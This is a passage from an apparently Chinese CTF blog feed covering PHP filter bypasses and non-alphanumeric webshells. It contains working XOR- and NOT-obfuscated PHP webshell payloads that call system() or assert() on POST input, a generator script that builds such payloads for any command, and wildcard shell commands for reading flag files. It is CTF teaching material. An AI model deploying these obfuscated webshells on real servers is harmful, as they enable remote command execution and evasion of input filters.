函数，用于搜索一个字符串中指定的字符串，整个表达式表示匹配由多个数字大小写字母组成的字符串。第二个 if 语句使用了strpos() 函数，用于查找字符串在另一个字符串中第一次出现的位置（区分大小写）。因此传入的 password 应该满足以数字或字母开头，且必须在 password 参数中找到 <code>--</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为 ereg 和 strpos 函数都只能处理字符串，如果传入数组返回的时NULL，NULL 不等于 false 同时满足两个条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password[]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="urldecode-二次编码绕过"><a href="#urldecode-二次编码绕过" class="headerlink" title="urldecode 二次编码绕过"></a>urldecode 二次编码绕过</h3><p>首先题目需要输入变量 id，且变量 id 不能包含字符串 <code>hackerDJ</code>。接着使用 urldecode() 函数进行 url 解码，需要令解码后的字符串等于 <code>hackerDJ</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br>      <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>      <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>显然我们可以通过二次URL编码来绕过，由于源码会使用 urldecode() 函数进行 url 解码，因此可以对 <code>hackerDJ</code> 进行二次URL编码。id 到达第一个 if 语句的时候还是 <code>%68%61%63%6b%65%72%44%4a</code> 到第二个 if 语句的时候已经被解码成 <code>hackerDJ</code> 了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id = %<span class="hljs-number">2568</span>%<span class="hljs-number">2561</span>%<span class="hljs-number">2563</span>%<span class="hljs-number">256</span>b%<span class="hljs-number">2565</span>%<span class="hljs-number">2572</span>%<span class="hljs-number">2544</span>%<span class="hljs-number">254</span>a<br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-variable">$year</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;year&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$year</span>==<span class="hljs-number">2022</span> &amp;&amp; <span class="hljs-variable">$year</span>+<span class="hljs-number">1</span>!==<span class="hljs-number">2023</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以使用科学计数法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?year=<span class="hljs-number">202.2e1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字webshell</title>
    <link href="/2023/01/18/No_alphanumeric_webshell/"/>
    <url>/2023/01/18/No_alphanumeric_webshell/</url>
    
    <content type="html"><![CDATA[<p>老生常谈的东西了，但之前一直没有好好总结。在2023山石网科CTF冬令营结营赛遇到了一道题当时没解出来，后面花了两天时间解出来了，非常痛苦，现在好好总结一下。</p><h2 id="无字母数字WebShell"><a href="#无字母数字WebShell" class="headerlink" title="无字母数字WebShell"></a>无字母数字WebShell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>基本上就是对上述正则表达式进行绕过，不能传入字母和数字。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h3><p>除了最常见的PHP标签<code>&lt;?php ?&gt;</code>之外，PHP还有两种短标签</p><ul><li><code>&lt;??&gt;</code>  相当于 <code>&lt;?php&gt;</code></li><li><code>&lt;?=?&gt;</code> 相当于 <code>&lt;?echo&gt;</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-string">&#x27;111&#x27;</span><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//会输出111</span><br></code></pre></td></tr></table></figure><p>在PHP5.4以后，无论short_open_tag是否开启，<code>&lt;?=?&gt;</code>这种写法总是适用的，<code>&lt;??&gt;</code>这种写法则需要short_open_tag开启才行。</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><ul><li>在正则表达式中，<code>?</code> 与其它字符一起组合成表达式，<strong>匹配前面的字符或表达式零次或一次</strong>。</li><li>在 Shell 命令行中，<code>?</code> 与其它字符一起组合成表达式，<strong>匹配任意一个字符</strong>。</li><li>在正则表达式中，<code>*</code> 与其它字符一起组合成表达式，<strong>匹配前面的字符或表达式零次或多次</strong>。</li><li>在 Shell 命令行中，<code>*</code> 与其它字符一起组合成表达式，<strong>匹配任意长度的字符串</strong>。这个字符串的长度可以是0，可以是1，可以是任意数字。</li></ul><p>所以，我们可以利用<code>?</code>和<code>*</code>在正则表达式和Shell命令行中的区别，绕过关键字过滤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">假设flag在/flag中:<br>cat /fla?<br>cat /fla*<br>    <br>假设flag在/flag.txt中:<br>cat /fla????<br>cat /fla*<br>    <br>假设flag在/root/flag.txt中:<br>cat /roo?/fla????<br>cat /ro*/fla*<br>    <br>假设flag在flagg文件加里:<br>cat /?????/fla?<br>cat /?????/fla*<br></code></pre></td></tr></table></figure><p>我们可以用以上格式的Payload读取flag</p><h3 id="PHP5与PHP7的区别"><a href="#PHP5与PHP7的区别" class="headerlink" title="PHP5与PHP7的区别"></a>PHP5与PHP7的区别</h3><ul><li><p>在 PHP 5 中，<code>assert()</code> 是一个函数，我们可以用 <code>$_=assert;$_()</code> 这样的形式来实现代码的动态执行。</p></li><li><p>在 PHP 7 中，<code>assert()</code> 变成了一个和 <code>eval()</code> 一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）</p></li><li><p>PHP5中，是不支持 <code>($a)()</code> 这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写 <code>(&#39;phpinfo&#39;)();</code></p></li></ul><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%01&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>a<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%02&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>b<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%03&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>c<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%18&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>x<br></code></pre></td></tr></table></figure><h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>这种攻击方法在PHP5中是可行的，如前面所说，在PHP7中，assert已经成为了一种语言结构，不支持这种调用方式。</p><h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h3><p>assert不行了，我们换一个函数其实也可以。这里使用system()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%13&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%19&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0d&#x27;</span> ^ <span class="hljs-string">&#x27;%60&#x27;</span>);<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>);<span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);<br><br><span class="hljs-comment">//system($_POST[_])</span><br></code></pre></td></tr></table></figure><h3 id="异或构造脚本"><a href="#异或构造脚本" class="headerlink" title="异或构造脚本"></a>异或构造脚本</h3><p>首先运行以上 PHP 脚本后，会生成一个 txt 文档 xor_rce.txt，里面包含所有可见字符的异或构造结果，可以通过题目给的正则表达式修改正则。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>;    <span class="hljs-comment">// 根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] your function：system<br>[+] your command：ls /<br>(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13%00%00&quot;|&quot;%60%60%20%2f&quot;);<br></code></pre></td></tr></table></figure><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p>P神的Webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><p>利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span 